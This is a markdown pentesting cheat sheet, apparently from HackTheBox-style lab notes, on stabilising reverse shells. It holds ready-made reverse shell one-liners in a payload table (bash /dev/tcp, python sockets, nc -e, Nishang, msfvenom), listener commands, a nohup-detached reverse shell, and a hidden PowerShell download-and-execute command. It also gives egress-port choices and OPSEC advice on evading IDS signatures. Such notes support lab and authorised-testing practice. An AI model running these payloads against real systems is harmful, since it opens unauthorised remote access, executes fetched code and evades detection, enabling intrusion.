# Shell Stabilization

> Most reverse shells start as fragile half-terminals: no Tab completion,
> no Ctrl+C, no arrow keys. Stabilising them is mandatory before any
> interactive work.

## The "full upgrade" recipe (Linux)

Three-step stabilisation on a Linux target:

```bash
# 1. Spawn a pseudo-TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# alternatives if python3 is missing:
#   python -c 'import pty; pty.spawn("/bin/bash")'
#   script -qc /bin/bash /dev/null
#   perl -e 'exec "/bin/bash";'
#   /usr/bin/expect -c 'spawn bash;interact'

# 2. Background the shell (Ctrl+Z), set local terminal raw, foreground
^Z
stty raw -echo; fg
# now press Enter twice; the prompt should reappear

# 3. Set TERM and size
export TERM=xterm
export SHELL=bash
stty rows 50 cols 200    # match your local terminal; `stty size` locally to read it
```

After that you can:
- Use Tab completion.
- Use Ctrl+C without killing your nc listener.
- Use `vi`, `less`, `ssh`, `mysql`, `sudo`.

## Variant: `script` instead of `pty.spawn`

When `python` isn't available:
```bash
script -qc /bin/bash /dev/null
```
Same interactive properties, no Python dependency.

## Windows — there is no "full upgrade"

PowerShell reverse shells from Nishang give you a *better* shell than nc
already. Things you can do:
- Run interactive cmdlets.
- Pipe output.
- Use Tab completion (PowerShell ≥ 5.0).

Things you cannot do reliably:
- Interact with `runas` (it expects a TTY).
- Press `Ctrl+C` without killing the shell.

When you need a *real* interactive Windows shell, your options are:
- **WinRM via evil-winrm** (best, once you have creds).
- **RDP** (`xfreerdp /u:... /p:... /v:<ip>`).
- **psexec / smbexec** (with creds; gets you SYSTEM or specified user).

## Reverse shell payload selection

| Target | Best initial payload |
|---|---|
| Linux with /bin/bash | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
| Linux with python | `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'` |
| Linux limited PATH | static netcat (`nc -e /bin/sh <ip> <port>` — not all nc builds support `-e`) |
| Windows w/ PowerShell | `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>` (Nishang) |
| Windows minimal | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o s.exe` |
| Egress-limited | `socat OPENSSL:` to port 443 |
| Behind WAF/IDS | encrypted payload via `chisel` or SSH reverse |

## Listener selection

```bash
# basic
nc -lvnp <port>

# better (handles control characters, lets you Ctrl-C without dying)
rlwrap nc -lvnp <port>

# multi-handler with auto-stabilisation
sudo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <ip>; set LPORT <port>; run'

# pwncat — modern; auto-upgrades to PTY, has post-exploitation modules
pwncat-cs -lp <port>
```

`pwncat-cs` is highly recommended; it does the three-step PTY upgrade
automatically and adds tons of post-exploitation niceties.

## Ports to choose for callbacks

In order of likelihood-to-work:

1. `443` — outbound HTTPS, almost always allowed.
2. `80` — outbound HTTP.
3. `53` — outbound DNS (some firewalls block, but rare).
4. `4444` — defaults; works on lab; flagged on real engagements.
5. High random port — works in most labs, may be blocked in real
   engagements with strict egress.

## "Caller picked a port that's already in use"
```bash
ss -tlnp | grep <port>            # find conflicting process
fuser -k <port>/tcp               # kill it (use with care)
```

## "Reverse shell connects then dies in <1s"

Common causes:
- Forgot to run the listener first.
- Target's outbound filtering kills connections after the SYN-ACK.
- Payload's process exits because the spawn failed (bad arch, missing
  shell).
- Target restarts the service that hosts your foothold (the shell is a
  child of that service).

For the last one, fork into a daemon-ish process:
```bash
# Linux
nohup bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' </dev/null &>/dev/null &
```
```powershell
# Windows
Start-Process powershell -WindowStyle Hidden -ArgumentList "-c", "IEX(iwr <ip>/p.ps1 -UseB)"
```

## Long-running session tips

```bash
# tmux: Ctrl-b, d to detach; tmux a to attach
tmux new -s htb

# Use a script to log all output (for write-ups later)
script -aq /tmp/htb-<box>.log
```

## OPSEC notes

- `nc -e` builds are the easiest signature for IDS. Prefer the
  `bash -i >& /dev/tcp/...` form.
- `msfvenom` payloads are heavily signatured. For real work, use shellcode
  encoders or roll your own loader.
- `pwncat-cs` writes telemetry to `~/.local/share/pwncat/`; don't use it
  on engagements where you're worried about local artefacts.

## See also

- [../reverse-shells/](../reverse-shells/)
- [../tool-usage/msfvenom.md](../tool-usage/msfvenom.md)
- [../tool-usage/netcat.md](../tool-usage/netcat.md)
